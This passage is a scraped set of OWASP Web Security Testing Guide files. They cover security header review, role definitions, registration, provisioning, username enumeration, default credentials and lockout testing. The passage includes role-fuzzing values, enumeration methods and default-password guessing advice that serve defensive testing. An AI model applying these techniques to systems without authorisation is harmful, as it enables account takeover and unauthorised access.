`ALLOW-FROM` in X-Frame-Options) that are no longer supported by modern browsers may create unnecessary risks.\n- **Invalid Placement of Security Headers:** Some headers are only effective under specific conditions. For example, headers like HSTS must be delivered over HTTPS; if sent over HTTP, they become ineffective.\n- **META Tag Handling Mistakes:** In cases where security policies such as Content-Security-Policy (CSP) are enforced via both HTTP headers and META tags (using `http-equiv`), there is a risk that the META tag value might override or conflict with the secure logic defined in the HTTP header. This can lead to a scenario where an insecure policy inadvertently takes precedence, weakening the overall security posture.\n\n## Risks of Misconfigured Security Headers\n\n- **Reduced Effectiveness:** Misconfigured headers might not provide the intended protection, leaving the application vulnerable to attacks such as XSS, Clickjacking, or CORS-related exploits.\n- **Breakage of Security Measures:** Duplicate headers or conflicting directives can result in browsers ignoring the HTTP security headers entirely, thereby disabling the intended protections.\n- **Introduction of New Attack Vectors:** The use of legacy or deprecated headers may introduce risks rather than mitigate them if modern browsers no longer support the intended security measures.\n\n## How to Test\n\n### Fetch and Review HTTP Security Headers\n\nTo inspect the security headers used by an application, employ the following methods:\n\n- **Intercepting Proxies:** Use tools such as **Burp Suite** to analyze server responses.\n- **Command Line Tools:** Execute a curl command to retrieve HTTP response headers: `curl -I https://example.com`\n    - Sometimes the web application will redirect to a new page, in order to follow redirect use the following command:`curl -L -I https://example.com`\n    - Some Firewalls may block curl's default User-Agent and some TLS/SSL errors will also prevent it from returning the correct information, in thise case you could try to use the following command:\n`curl -I -L -k --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36\" https://example.com`\n- **Browser Developer Tools:** Open developer tools (F12), navigate to the **Network** tab, select a request, and view the **Headers** section.\n\n### Check for Overly Permissive Security Headers\n\n- **Identify Risky Headers:** Look for headers that could allow excessive access, such as:\n- **Evaluate Directives:** Verify whether strict directives are enforced. For example, an overpermissive setup might appear as:\n\n    ```http\n    Access-Control-Allow-Origin: *\n    Access-Control-Allow-Credentials: true\n    X-Permitted-Cross-Domain-Policies: all\n    Referrer-Policy: unsafe-url\n    ```\n\n    A safe configuration would look like:\n\n    ```http\n    Access-Control-Allow-Origin: {theallowedoriginurl}\n    X-Permitted-Cross-Domain-Policies: none\n    Referrer-Policy: no-referrer\n    ```\n\n- **Cross-Reference Documentation:** Use resources such as the [Mozilla Developer Network: Security Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) to review secure and insecure directives.\n\n### Check for Duplicate, Deprecated / Obsolete Headers\n\n- **Duplicate Headers:** Ensure that the same header is not defined multiple times with conflicting values.\n- **Obsolete Headers:** Identify and remove deprecated headers (e.g., HPKP) and outdated directives (e.g., `ALLOW-FROM` in X-Frame-Options). Refer to sources like [Mozilla Developer Network: X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options) for current standards.\n\n### Confirm Proper Placement of Security Headers\n\n- **Protocol-Specific Requirements:** Validate that headers intended for secure contexts (e.g., HSTS) are delivered only under appropriate conditions (i.e., over HTTPS).\n- **Conditional Delivery:** Some headers may only be effective under specific circumstances. Verify that these conditions are met for the header to function as intended.\n\n### Evaluate META Tag Handling\n\n- **Dual Enforcement Checks:** When a security policy like CSP is applied through both an HTTP header and a META tag using `http-equiv`, confirm that the HTTP header (which is generally considered more authoritative) is not inadvertently overridden by the META tag.\n- **Review Browser Behavior:** Test the application in various browsers to see if any differences occur due to the presence of conflicting directives. Where possible, avoid using dual definitions to prevent unintended security lapses.\n\n## Remediation\n\n- **Correct Header Configuration:** Ensure that headers are correctly implemented with proper values and no typos.\n- **Enforce Strict Directives:** Configure headers with the most secure settings that still allow for required functionality. For example, avoid using `*` in CORS policies unless absolutely necessary.\n- **Remove Deprecated Headers:** Replace legacy security headers with modern equivalents and remove any that are no longer supported.\n- **Avoid Conflicting Definitions:** Prevent duplicate header definitions and ensure that META tags do not conflict with HTTP headers for security policies.\n\n## Tools\n\n- [Mozilla Observatory](https://observatory.mozilla.org/)\n- [ZAP](https://www.zaproxy.org/)\n- [Burp Suite](https://portswigger.net/burp)\n- Browser Developer Tools (Chrome, Firefox, Edge)\n\n## References\n\n- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)\n- [Mozilla Developer Network: Security Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)\n- [RFC 6797 - HTTP Strict Transport Security (HSTS)](https://datatracker.ietf.org/doc/html/rfc6797)\n- [Google Web Security Guidelines](https://web.dev/security-headers/)\n- [HPKP is No More](https://scotthelme.co.uk/hpkp-is-no-more/)\n", "timestamp": "2025-10-24T11:39:45.068350"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README.md", "content": "# 4.2 Configuration and Deployment Management Testing\n\n4.2.1 [Test Network Infrastructure Configuration](01-Test_Network_Infrastructure_Configuration.md)\n\n4.2.2 [Test Application Platform Configuration](02-Test_Application_Platform_Configuration.md)\n\n4.2.3 [Test File Extensions Handling for Sensitive Information](03-Test_File_Extensions_Handling_for_Sensitive_Information.md)\n\n4.2.4 [Review Old Backup and Unreferenced Files for Sensitive Information](04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.md)\n\n4.2.5 [Enumerate Infrastructure and Application Admin Interfaces](05-Enumerate_Infrastructure_and_Application_Admin_Interfaces.md)\n\n4.2.6 [Test HTTP Methods](06-Test_HTTP_Methods.md)\n\n4.2.7 [Test HTTP Strict Transport Security](07-Test_HTTP_Strict_Transport_Security.md)\n\n4.2.8 [Test RIA Cross Domain Policy](08-Test_RIA_Cross_Domain_Policy.md)\n\n4.2.9 [Test File Permission](09-Test_File_Permission.md)\n\n4.2.10 [Test for Subdomain Takeover](10-Test_for_Subdomain_Takeover.md)\n\n4.2.11 [Test Cloud Storage](11-Test_Cloud_Storage.md)\n\n4.2.12 [Test for Content Security Policy](12-Test_for_Content_Security_Policy.md)\n\n4.2.13 [Test for Path Confusion](13-Test_for_Path_Confusion.md)\n\n4.2.14 [Test for Other HTTP Security Header Misconfigurations](14-Test_Other_HTTP_Security_Header_Misconfigurations.md)\n", "timestamp": "2025-10-24T11:39:45.145325"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/01-Test_Role_Definitions.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/01-Test_Role_Definitions.md", "content": "# Test Role Definitions\n\n|ID          |\n|------------|\n|WSTG-IDNT-01|\n\n## Summary\n\nApplications have several types of functionalities and services, and those require access permissions based on the needs of the user. That user could be:\n\n- an administrator, where they manage the application functionalities.\n- an auditor, where they review the application transactions and provide a detailed report.\n- a support engineer, where they help customers debug and fix issues on their accounts.\n- a customer, where they interact with the application and benefit from its services.\n\nIn order to handle these uses and any other use case for that application, role definitions are setup (more commonly known as [RBAC](https://en.wikipedia.org/wiki/Role-based_access_control)). Based on these roles, the user is capable of accomplishing the required task.\n\n## Test Objectives\n\n- Identify and document roles used by the application.\n- Attempt to switch, change, or access another role.\n- Review the granularity of the roles and the needs behind the permissions given.\n\n## How to Test\n\n### Roles Identification\n\nThe tester should start by identifying the application roles being tested through any of the following methods:\n\n- Application documentation.\n- Guidance by the developers or administrators of the application.\n- Application comments.\n- Fuzz possible roles:\n    - cookie variable (*e.g.* `role=admin`, `isAdmin=True`)\n    - account variable (*e.g.* `Role: manager`)\n    - hidden directories or files (*e.g.* `/admin`, `/mod`, `/backups`)\n    - switching to well known users (*e.g.* `admin`, `backups`, etc.)\n\n### Switching to Available Roles\n\nAfter identifying possible attack vectors, the tester needs to test and validate that they can access the available roles.\n\n> Some applications define the roles of the user on creation, through rigorous checks and policies, or by ensuring that the user's role is properly protected through a signature created by the backend. Finding that roles exist doesn't mean that they're a vulnerability.\n\n### Review Roles Permissions\n\nAfter gaining access to the roles on the system, the tester must understand the permissions provided to each role.\n\nA support engineer shouldn't be able to conduct administrative functionalities, manage the backups, or conduct any transactions in the place of a user.\n\nAn administrator shouldn't have full powers on the system. Sensitive admin functionality should leverage a maker-checker principle, or use MFA to ensure that the administrator is conducting the transaction. A clear example on this was the [Twitter incident in 2020](https://blog.twitter.com/en_us/topics/company/2020/an-update-on-our-security-incident.html).\n\n## Tools\n\nThe above mentioned tests can be conducted without the use of any tool, except the one being used to access the system.\n\nTo make things easier and more documented, one can use:\n\n- [Burp's Autorize extension](https://github.com/Quitten/Autorize)\n- [ZAP's Access Control Testing add-on](https://www.zaproxy.org/docs/desktop/addons/access-control-testing/)\n\n## References\n\n- [Role Engineering for Enterprise Security Management, E Coyne & J Davis, 2007](https://www.bookdepository.co.uk/Role-Engineering-for-Enterprise-Security-Management-Edward-Coyne/9781596932180)\n- [Role engineering and RBAC standards](https://csrc.nist.gov/projects/role-based-access-control#rbac-standard)\n", "timestamp": "2025-10-24T11:39:45.651071"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Test_User_Registration_Process.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Test_User_Registration_Process.md", "content": "# Test User Registration Process\n\n|ID          |\n|------------|\n|WSTG-IDNT-02|\n\n## Summary\n\nSome websites offer a user registration process that automates (or semi-automates) the provisioning of system access to users. The identity requirements for access vary from positive identification to none at all, depending on the security requirements of the system. Many public applications completely automate the registration and provisioning process because the size of the user base makes it impossible to manage manually. However, many corporate applications will provision users manually, so this test case may not apply.\n\n## Test Objectives\n\n- Verify that the identity requirements for user registration are aligned with business and security requirements.\n- Validate the registration process.\n\n## How to Test\n\nVerify that the identity requirements for user registration are aligned with business and security requirements:\n\n1. Can anyone register for access?\n2. Are registrations vetted by a human prior to provisioning, or are they automatically granted if the criteria are met?\n3. Can the same person or identity register multiple times?\n4. Can users register for different roles or permissions?\n5. What proof of identity is required for a registration to be successful?\n6. Are registered identities verified?\n\nValidate the registration process:\n\n1. Can identity information be easily forged or faked?\n2. Can the exchange of identity information be manipulated during registration?\n\n### Example\n\nIn the WordPress example below, the only identification requirement is an email address that is accessible to the registrant.\n\n![WordPress Registration Page](images/Wordpress_registration_page.jpg)\\\n*Figure 4.3.2-1: WordPress Registration Page*\n\nIn contrast, in the Google example below the identification requirements include name, date of birth, country, mobile phone number, email address and CAPTCHA response. While only two of these can be verified (email address and mobile number), the identification requirements are stricter than WordPress.\n\n![Google Registration Page](images/Google_registration_page.jpg)\\\n*Figure 4.3.2-2: Google Registration Page*\n\n## Remediation\n\nImplement identification and verification requirements that correspond to the security requirements of the information the credentials protect.\n\n## Tools\n\nA HTTP proxy can be a useful tool to test this control.\n\n## References\n\n[User Registration Design](https://mashable.com/2011/06/09/user-registration-design/)\n", "timestamp": "2025-10-24T11:39:45.765141"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/03-Test_Account_Provisioning_Process.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/03-Test_Account_Provisioning_Process.md", "content": "# Test Account Provisioning Process\n\n|ID          |\n|------------|\n|WSTG-IDNT-03|\n\n## Summary\n\nThe provisioning of accounts presents an opportunity for an attacker to create a valid account without application of the proper identification and authorization process.\n\n## Test Objectives\n\n- Verify which accounts may provision other accounts and of what type.\n\n## How to Test\n\nDetermine which roles are able to provision users and what sort of accounts they can provision.\n\n- Is there any verification, vetting and authorization of provisioning requests?\n- Is there any verification, vetting and authorization of de-provisioning requests?\n- Can an administrator provision other administrators or just users?\n- Can an administrator or other user provision accounts with privileges greater than their own?\n- Can an administrator or user de-provision themselves?\n- How are the files or resources owned by the de-provisioned user managed? Are they deleted? Is access transferred?\n\n### Example\n\nIn WordPress, only a user's name and email address are required to provision the user, as shown below:\n\n![WordPress User Add](images/Wordpress_useradd.png)\\\n*Figure 4.3.3-1: WordPress User Add*\n\nDe-provisioning of users requires the administrator to select the users to be de-provisioned, select Delete from the dropdown menu (circled) and then applying this action. The administrator is then presented with a dialog box asking what to do with the user's posts (delete or transfer them).\n\n![WordPress Auth and Users](images/Wordpress_authandusers.png)\\\n*Figure 4.3.3-2: WordPress Auth and Users*\n\n## Tools\n\nWhile the most thorough and accurate approach to completing this test is to conduct it manually, HTTP proxy tools could be also useful.\n", "timestamp": "2025-10-24T11:39:45.831786"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md", "content": "# Testing for Account Enumeration and Guessable User Account\n\n|ID          |\n|------------|\n|WSTG-IDNT-04|\n\n## Summary\n\nThe scope of this test is to verify if it is possible to collect a set of valid usernames by interacting with the authentication mechanism of the application. This test will be useful for brute force testing, in which the tester verifies if, given a valid username, it is possible to find the corresponding password.\n\nOften, web applications reveal when a username exists on system, either as a consequence of mis-configuration or as a design decision. For example, sometimes, when we submit wrong credentials, we receive a message that states that either the username is present on the system or the provided password is wrong. The information obtained can be used by an attacker to gain a list of users on system. This information can be used to attack the web application, for example, through a brute force or default username and password attack.\n\nThe tester should interact with the authentication mechanism of the application to understand if sending particular requests causes the application to answer in different manners. This issue exists because the information released from web application or web server when the user provides a valid username is different than when they use an invalid one.\n\nIn some cases, a message is received that reveals if the provided credentials are wrong because an invalid username or an invalid password was used. Sometimes, testers can enumerate the existing users by sending a username and an empty password.\n\n## Test Objectives\n\n- Review processes that pertain to user identification (*e.g.* registration, login, etc.).\n- Enumerate users where possible through response analysis.\n\n## How to Test\n\nIn black-box testing, the tester knows nothing about the specific application, username, application logic, error messages on log in page, or password recovery facilities. If the application is vulnerable, the tester receives a response message that reveals, directly or indirectly, some information useful for enumerating users.\n\n### HTTP Response Message\n\n#### Testing for Valid Credentials\n\nRecord the server answer when you submit a valid user ID and valid password.\n\n> Using a web proxy, notice the information retrieved from this successful authentication (HTTP 200 Response, length of the response).\n\n#### Testing for Valid User with Wrong Password\n\nNow, the tester should try to insert a valid user ID and a wrong password and record the error message generated by the application.\n\n> The browser should display a message similar to the following one:\n>\n> ![Authentication Failed](images/AuthenticationFailed.png)\\\n> *Figure 4.3.4-1: Authentication Failed*\n>\n> Unlike any message that reveals the existence of the user like the following:\n>\n> `Login for User foo: invalid password`\n>\n> Using a web proxy, notice the information retrieved from this unsuccessful authentication attempt (HTTP 200 Response, length of the response).\n\n#### Testing for a Nonexistent Username\n\nNow, the tester should try to insert an invalid user ID and a wrong password and record the server answer (the tester should be confident that the username is not valid in the application). Record the error message and the server answer.\n\n> If the tester enters a nonexistent user ID, they can receive a message similar to:\n>\n> ![This User is Not Active](images/Userisnotactive.png)\\\n> *Figure 4.3.4-3: This User is Not Active*\n>\n> or a message like the following one:\n>\n> `Login failed for User foo: invalid Account`\n>\n> Generally the application should respond with the same error message and length to the different incorrect requests. If the responses are not the same, the tester should investigate and find out the key that creates a difference between the two responses. For example:\n>\n> 1. Client request: Valid user/wrong password\n> 2. Server response: The password is not correct\n> 3. Client request: Wrong user/wrong password\n> 4. Server response: User not recognized\n>\n> The above responses let the client understand that for the first request they have a valid username. So they can interact with the application requesting a set of possible user IDs and observing the answer.\n>\n> Looking at the second server response, the tester understand in the same way that they don't hold a valid username. So they can interact in the same manner and create a list of valid user ID looking at the server answers.\n\n### Other Ways to Enumerate Users\n\nTesters can enumerate users in several ways, such as:\n\n#### Analyzing the Error Code Received on Login Pages\n\nSome web application release a specific error code or message that we can analyze.\n\n#### Analyzing URLs and URL Redirections\n\nFor example:\n\n- `https://www.foo.com/err.jsp?User=baduser&Error=0`\n- `https://www.foo.com/err.jsp?User=gooduser&Error=2`\n\nAs is seen above, when a tester provides a user ID and password to the web application, they see a message indication that an error has occurred in the URL. In the first case they have provided a bad user ID and bad password. In the second, a good user ID and a bad password, so they can identify a valid user ID.\n\n#### URI Probing\n\nSometimes a web server responds differently if it receives a request for an existing directory or not. For instance in some portals every user is associated with a directory. If testers try to access an existing directory they could receive a web server error.\n\nSome of the common errors received from web servers are:\n\n- 403 Forbidden error code\n- 404 Not found error code\n\nExample:\n\n- `https://www.foo.com/account1` - we receive from web server: 403 Forbidden\n- `https://www.foo.com/account2` - we receive from web server: 404 file Not Found\n\nIn the first case the user exists, but the tester cannot view the web page, in second case instead the user \"account2\" does not exist. By collecting this information testers can enumerate the users.\n\n#### Analyzing Web Page Titles\n\nTesters can receive useful information on Title of web page, where they can obtain a specific error code or messages that reveal if the problems are with the username or password.\n\nFor instance, if a user cannot authenticate to an application and receives a web page whose title is similar to:\n\n- `Invalid user`\n- `Invalid authentication`\n\n#### Analyzing a Message Received from a Recovery Facility\n\nWhen we use a recovery facility (i.e. a forgotten password function) a vulnerable application might return a message that reveals if a username exists or not.\n\nFor example, messages similar to the following:\n\n- `Invalid username: email address is not valid or the specified user was not found.`\n- `Valid username: Your password has been successfully sent to the email address you registered with.`\n\n#### Friendly 404 Error Message\n\nWhen we request a user within the directory that does not exist, we don't always receive 404 error code. Instead, we may receive \"200 OK\" with an image, in this case we can assume that when we receive the specific image the user does not exist. This logic can be applied to other web server response; the trick is a good analysis of web server and web application messages.\n\n#### Analyzing Response Times\n\nAs well as looking at the content of the responses, the time that the response takes should also be considered. Particularly where the request causes an interaction with an external service (such as sending a forgotten password email), this can add several hundred milliseconds to the response, which can be used to determine whether the requested user is valid.\n\n### Guessing Users\n\nIn some cases the user IDs are created with specific policies of administrator or company. For example we can view a user with a user ID created in sequential order:\n\n```text\nCN000100\nCN000101\n...\n```\n\nSometimes the usernames are created with a REALM alias and then a sequential numbers:\n\n- R1001 – user 001 for REALM1\n- R2001 – user 001 for REALM2\n\nIn the above sample we can create simple shell scripts that compose user IDs and submit a request with tool like wget to automate a web query to discern valid user IDs. To create a script we can also use Perl and curl.\n\nOther possibilities are: - user IDs associated with credit card numbers, or in general numbers with a pattern. - user IDs associated with real names, e.g. if Freddie Mercury has a user ID of \"fmercury\", then you might guess Roger Taylor to have the user ID of \"rtaylor\".\n\nAgain, we can guess a username from the information received from an LDAP query or from Google information gathering, for example, from a specific domain. Google can help to find domain users through specific queries or through a simple shell script or tool.\n\n> By enumerating user accounts, you risk locking out accounts after a predefined number of failed probes (based on application policy). Also, sometimes, your IP address can be banned by dynamic rules on the application firewall or Intrusion Prevention System.\n\n### Testing Staff Impersonation\n\nEnsure that unregistered users are unable to select reserved usernames (e.g., admin, administrator, moderator) during the registration process. Additionally, verify that users cannot edit their current username to one of these reserved usernames on the profile editing page.\n\nIf the web application has features that allow a user to access the web application's registration and profile editing functionality, the interactions to test include the following:\n\n- Registration process:\n    - Access the registration page as an unregistered user and fill in the registration form, entering one of the reserved usernames (e.g., admin, administrator, moderator), submit the registration form, and then verify the response.\n    - The registration process should reject the form submission and display an error message indicating that the selected username is not available for registration.\n- Profile editing page:\n    - Log into the web application using valid credentials and navigate to the profile editing page. Attempt to change the current username to one of the reserved usernames (e.g., admin, administrator, moderator) and save the changes to verify the behavior.\n    - The profile editing process should reject the username change request and display an error message indicating that the selected username is not available.\n- Test for variants and similarities:\n    - Repeat the above steps for different variations of the reserved usernames (e.g., Admin, ADMIN, Administrator) and perform tests with different combinations of uppercase and lowercase letters to ensure case insensitivity is handled correctly.\n    - The web application should treat these variants as identical to the reserved usernames, rejecting their selection or modification.\n\n### Gray-Box Testing\n\n#### Testing for Authentication Error Messages\n\nVerify that the application answers in the same manner for every client request that produces a failed authentication. For this issue the black-box testing and gray-box testing have the same concept based on the analysis of messages or error codes received from web application.\n\n> The application should answer in the same manner for every failed attempt of authentication.\n>\n> For Example: *Credentials submitted are not valid*\n\n## Remediation\n\nEnsure the application returns consistent generic error messages in response to invalid account name, password or other user credentials entered during the log in process.\n\nEnsure default system accounts and test accounts are deleted prior to releasing the system into production (or exposing it to an untrusted network).\n\n## Tools\n\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)\n- [curl](https://curl.haxx.se/)\n- [PERL](https://www.perl.org)\n\n## References\n\n- [Username Enumeration Vulnerabilities](https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/)\n- [Prevent WordPress Username Enumeration](https://www.jinsonvarghese.com/prevent-wordpress-username-enumeration/)\n- [Marco Mella, Sun Java Access & Identity Manager Users enumeration](https://www.exploit-db.com/exploits/32762)\n", "timestamp": "2025-10-24T11:39:45.909231"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy.md", "content": "# Testing for Weak or Unenforced Username Policy\n\n|ID          |\n|------------|\n|WSTG-IDNT-05|\n\n## Summary\n\nUser account names are often highly structured (e.g. Joe Bloggs account name is jbloggs and Fred Nurks account name is fnurks) and valid account names can easily be guessed.\n\n## Test Objectives\n\n- Determine whether a consistent account name structure renders the application vulnerable to account enumeration.\n- Determine whether the application's error messages permit account enumeration.\n\n## How to Test\n\n- Determine the structure of account names.\n- Evaluate the application's response to valid and invalid account names.\n- Use different responses to valid and invalid account names to enumerate valid account names.\n- Use account name dictionaries to enumerate valid account names.\n\n## Remediation\n\nEnsure the application returns consistent generic error messages in response to invalid account name, password or other user credentials entered during the log in process.\n", "timestamp": "2025-10-24T11:39:46.041436"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/README.md", "content": "# 4.3 Identity Management Testing\n\n4.3.1 [Test Role Definitions](01-Test_Role_Definitions.md)\n\n4.3.2 [Test User Registration Process](02-Test_User_Registration_Process.md)\n\n4.3.3 [Test Account Provisioning Process](03-Test_Account_Provisioning_Process.md)\n\n4.3.4 [Testing for Account Enumeration and Guessable User Account](04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md)\n\n4.3.5 [Testing for Weak or Unenforced Username Policy](05-Testing_for_Weak_or_Unenforced_Username_Policy.md)\n", "timestamp": "2025-10-24T11:39:46.101940"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/04-Authentication_Testing/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel.md", "content": "# Testing for Credentials Transported over an Encrypted Channel\n\n|ID          |\n|------------|\n|WSTG-ATHN-01|\n\nThis content has been merged into: [Testing for Sensitive Information Sent via Unencrypted Channels](../09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md)\n", "timestamp": "2025-10-24T11:39:46.634554"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials.md", "content": "# Testing for Default Credentials\n\n|ID          |\n|------------|\n|WSTG-ATHN-02|\n\n## Summary\n\nMany web applications and hardware devices have default passwords for the built-in administrative account. Although in some cases these can be randomly generated, they are often static, meaning that they can be easily guessed or obtained by an attacker.\n\nAdditionally, when new users are created on the applications, these may have predefined passwords set. These could either be generated automatically by the application, or manually created by staff. In both cases, if they are not generated in a secure manner, the passwords may be possible for an attacker to guess.\n\n## Test Objectives\n\n- Determine whether the application has any user accounts with default passwords.\n- Review whether new user accounts are created with weak or predictable passwords.\n\n## How to Test\n\n### Testing for Vendor Default Credentials\n\nThe first step to identifying default passwords is to identify the software that is in use. This is covered in detail in the [Information Gathering](../01-Information_Gathering/README.md) section of the guide.\n\nOnce the software has been identified, try to find whether it uses default passwords, and if so, what they are. This should include:\n\n- Searching for \"[SOFTWARE] default password\".\n- Reviewing the manual or vendor documentation.\n- Checking common default password databases, such as [CIRT.net](https://cirt.net/passwords), [SecLists Default Passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials) or [DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv).\n- Inspecting the application source code (if available).\n- Installing the application on a virtual machine and inspecting it.\n- Inspecting the physical hardware for stickers (often present on network devices).\n\nIf a default password can't be found, try common options such as:\n\n- \"admin\", \"password\", \"12345\", or other [common default passwords](https://github.com/nixawk/fuzzdb/blob/master/bruteforce/passwds/default_devices_users%2Bpasswords.txt).\n- An empty or blank password.\n- The serial number or MAC address of the device.\n\nIf the username is unknown, there are various options for enumerating users, discussed in the [Testing for Account Enumeration](../03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md) guide. Alternatively, try common options such as \"admin\", \"root\", or \"system\".\n\n### Testing for Organization Default Passwords\n\nWhen staff within an organization manually create passwords for new accounts, they may do so in a predictable way. This can often be:\n\n- A single common password such as \"Password1\".\n- Organization specific details, such as the organization name or address.\n- Passwords that follow a simple pattern, such as \"Monday123\" if account is created on a Monday.\n\nThese types of passwords are often difficult to identify from a black-box perspective, unless they can successfully be guessed or brute-forced. However, they are easy to identify when performing grey-box or white-box testing.\n\n### Testing for Application Generated Default Passwords\n\nIf the application automatically generates passwords for new user accounts, these may also be predictable. In order to test these, create multiple accounts on the application with similar details at the same time, and compare the passwords that are given for them.\n\nThe passwords may be based on:\n\n- A single static string shared between accounts.\n- A hashed or obfuscated part of the account details, such as `md5($username)`.\n- A time-based algorithm.\n- A weak pseudo-random number generator (PRNG).\n\nThis type of issue of often difficult to identify from a black-box perspective.\n\n## Tools\n\n- [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder)\n- [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)\n- [Nikto 2](https://www.cirt.net/nikto2)\n- [Nuclei](https://github.com/projectdiscovery/nuclei)\n    - [Default Login - Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/tree/6b26c63d8f63b2a812a478f14c4c098b485d54b4/http/default-logins)\n\n## References\n\n- [CIRT](https://cirt.net/passwords)\n- [SecLists Default Passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)\n- [DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)\n", "timestamp": "2025-10-24T11:39:46.702381"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism.md", "content": "# Testing for Weak Lock Out Mechanism\n\n|ID          |\n|------------|\n|WSTG-ATHN-03|\n\n## Summary\n\nAccount lockout mechanisms are used to mitigate brute force attacks. Some of the attacks that can be defeated by using lockout mechanism:\n\n- Login password or username guessing attack.\n- Code guessing on any 2FA functionality or Security Questions.\n\nAccount lockout mechanisms require a balance between protecting accounts from unauthorized access and protecting users from being denied authorized access. Accounts are typically locked after 3 to 5 unsuccessful attempts and can only be unlocked after a predetermined period of time, via a self-service unlock mechanism, or intervention by an administrator.\n\nDespite it being easy to conduct brute force attacks, the result of a successful attack is dangerous as the attacker will have full access on the user account and with it all the functionality and services they have access to.\n\n## Test Objectives\n\n- Evaluate the account lockout mechanism's ability to mitigate brute force password guessing.\n- Evaluate the unlock mechanism's resistance to unauthorized account unlocking.\n\n## How to Test\n\n### Lockout Mechanism\n\nTo test the strength of lockout mechanisms, you will need access to an account that you are willing or can afford to lock. If you have only one account with which you can log on to the web application, perform this test at the end of your test plan to avoid losing testing time by being locked out.\n\nTo evaluate the account lockout mechanism's ability to mitigate brute force password guessing, attempt an invalid log in by using the incorrect password a number of times, before using the correct password to verify that the account was locked out. An example test may be as follows:\n\n1. Attempt to log in with an incorrect password 3 times.\n2. Successfully log in with the correct password, thereby showing that the lockout mechanism doesn't trigger after 3 incorrect authentication attempts.\n3. Attempt to log in with an incorrect password 4 times.\n4. Successfully log in with the correct password, thereby showing that the lockout mechanism doesn't trigger after 4 incorrect authentication attempts.\n5. Attempt to log in with an incorrect password 5 times.\n6. Attempt to log in with the correct password. The application returns \"Your account is locked out.\", thereby confirming that the account is locked out after 5 incorrect authentication attempts.\n7. Attempt to log in with the correct password 5 minutes later. The application returns \"Your account is locked out.\", thereby showing that the lockout mechanism does not automatically unlock after 5 minutes.\n8. Attempt to log in with the correct password 10 minutes later. The application returns \"Your account is locked out.\", thereby showing that the lockout mechanism does not automatically unlock after 10 minutes.\n9. Successfully log in with the correct password 15 minutes later, thereby showing that the lockout mechanism automatically unlocks after a 10 to 15 minute period.\n\n#### Unique Lockout Mechanisms\n\nThere are more unique implementations of lockout mechanisms in use that are still acceptable. One of which is AWS's [Cognito](https://docs.aws.amazon.com/cognito/latest/developerguide/authentication.html#authentication-flow-lockout-behavior). It uses a simple scaling algorithm that mitigates brute-force attacks while not enabling long-term denial-of-service attacks against the affected user. After 5 failed sign-in attempts with a password, the user is locked out for one second. The lockout duration doubles with each failed attempt, with a maximum of 15 